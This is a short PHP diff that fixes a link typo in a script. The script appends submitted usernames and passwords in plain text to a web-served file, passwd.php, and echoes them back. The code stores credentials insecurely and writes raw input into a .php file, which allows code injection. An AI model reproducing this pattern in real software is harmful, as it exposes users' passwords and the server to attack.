@@ -11,5 +11,5 @@ $file = "passwd.php";
 $nudata = "USER: ".$usrname." : ".$passwd."\n\n";
 file_put_contents($file, $nudata, FILE_APPEND | LOCK_EX);
 echo "User-password: ".$usrname." - ".$passwd."\n";
-echo "<a href='passwrd.php'>View</a>\n";
+echo "<a href='passwd.php'>View</a>\n";
 ?>
